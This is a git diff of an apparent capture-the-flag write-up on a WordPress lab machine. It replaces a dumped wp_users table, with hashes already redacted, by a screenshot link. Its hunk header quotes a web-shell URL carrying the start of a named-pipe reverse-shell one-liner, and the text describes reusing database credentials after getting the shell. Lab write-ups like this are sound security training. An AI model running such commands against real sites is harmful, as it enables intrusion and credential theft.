@@ -278,21 +278,7 @@ http://www.smol.thm/wp-admin/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff
 
 We finally got a reverse shell but there's still probably a long road remaining. I remembered we logged into the wp-login page using the database credentials so firstly I'm gonna try and connect to the database and maybe get some hashes from there. I try to log into mysql and we're **successful**. From there we get:
 
-```
-mysql> SELECT * from wp_users;
-SELECT * from wp_users;
-+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
-| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
-+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
-|  1 | admin      | redacted | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
-|  2 | wpuser     | redacted | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
-|  3 | think      | redacted | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
-|  4 | gege       | redacted | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
-|  5 | diego      | redacted | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
-|  6 | xavi       | redacted | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
-+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
-
-```
+![hashes](./screenshots/post1.png)
 
 
 
